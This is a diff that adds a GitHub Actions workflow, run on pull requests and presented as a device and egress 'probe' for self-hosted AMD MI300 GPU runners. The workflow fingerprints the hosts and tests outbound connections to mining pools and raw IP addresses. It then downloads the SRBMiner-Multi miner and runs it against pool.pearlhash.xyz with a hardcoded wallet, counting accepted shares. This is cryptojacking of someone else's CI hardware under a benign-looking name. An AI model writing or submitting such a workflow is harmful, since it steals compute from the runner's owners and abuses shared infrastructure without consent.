@@ -1,0 +1,74 @@
+name: c211-130109-mi300probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  mi300-probe:
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 1, ngpu: 2}
+          - {label: linux-mi300-2gpu-sglang, grp: 2gpu, idx: 2, ngpu: 2}
+          - {label: linux-mi300-4gpu-sglang, grp: 4gpu, idx: 1, ngpu: 4}
+          - {label: linux-mi300-8gpu-sglang, grp: 8gpu, idx: 1, ngpu: 8}
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 12
+    steps:
+      - name: srb-device-and-egress-probe
+        env:
+          IDX: ${{ matrix.idx }}
+          GRP: ${{ matrix.grp }}
+          NG: ${{ matrix.ngpu }}
+        run: |
+          set +e
+          I=130109
+          D="$HOME/c211-$I-$GRP-$IDX"; mkdir -p "$D"
+          TS() { date -u +%FT%TZ; }
+          echo "C211_JOB=mi300probe-$GRP-$IDX host=$(hostname) at=$(TS) ngpu=$NG"
+          uname -a 2>&1 | head -1
+          echo "AMDGPU_MODULE_VERSION=$(cat /sys/module/amdgpu/version 2>/dev/null)"
+          rocm-smi --showuniqueid --showproductname 2>&1 | head -60
+          echo "--- egress matrix ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791 169.58.247.186:443 3.112.174.116:443 3.112.174.116:80 1.1.1.1:443 github.com:443 api.github.com:443 raw.githubusercontent.com:443 objects.githubusercontent.com:443 codeload.github.com:443 google.com:443 8.8.8.8:443 202.168.68.235:443 216.47.155.69:9999; do
+            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          echo "--- dns ---"
+          getent hosts pool.pearlhash.xyz global.pearlhash.net global2.pearlhash.net hk.pearlhash.net 2>&1 | head -10
+          echo "--- srb 3.8.8 from github release ---"
+          TGZ_SHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
+          BIN_SHA=b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb
+          ok=0
+          for a in 1 2 3; do
+            curl -fsSL --max-time 180 -o "$D/srb.tgz" https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz 2>/dev/null
+            S=$(sha256sum "$D/srb.tgz" 2>/dev/null | awk '{print $1}')
+            echo "SRB_TGZ a=$a size=$(stat -c %s "$D/srb.tgz" 2>/dev/null) sha=$S"
+            if [ "$S" = "$TGZ_SHA" ]; then ok=1; break; fi
+            sleep 3
+          done
+          echo "SRB_TGZ_OK=$ok"
+          mkdir -p "$D/srb"
+          tar -xzf "$D/srb.tgz" -C "$D/srb" 2>/dev/null && echo SRB_EXTRACT_OK || echo SRB_EXTRACT_FAIL
+          SB=$(find "$D/srb" -type f -name 'srbminer-multi' | head -1); echo "SRB_BIN=$SB"
+          chmod +x "$SB" 2>/dev/null
+          echo "SRB_BIN_SHA=$(sha256sum "$SB" 2>/dev/null | awk '{print $1}')"
+          echo "SRB_BIN_SHA_EXPECT=$BIN_SHA"
+          echo "--- srb devices ---"
+          timeout 90 "$SB" --list-devices > "$D/dev.txt" 2>&1
+          echo "SRB_LIST_RC=$?"
+          head -80 "$D/dev.txt"
+          DEVC=$(grep -ciE 'GPU #|MI300|gfx942|AMD' "$D/dev.txt" 2>/dev/null); DEVC=${DEVC:-0}
+          echo "SRB_DEV_HITS=$DEVC"
+          echo "--- short pearlhash probe only if devices look present ---"
+          if [ "$DEVC" -gt 0 ]; then
+            timeout 240 "$SB" --algorithm pearlhash --pool pool.pearlhash.xyz:9000 --wallet prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql --worker "${I}${IDX}0" --password x --disable-cpu --api-enable > "$D/srb-ph.log" 2>&1
+            echo "PH_RC=$?"
+            tail -25 "$D/srb-ph.log"
+            echo "PH_ACC_LINES=$(grep -aci 'accepted' "$D/srb-ph.log" 2>/dev/null)"
+          else
+            echo "SRB_NO_DEVICE_SKIP_MINE"
+          fi
+          echo "C211_PROBE_END $GRP-$IDX at=$(TS)"
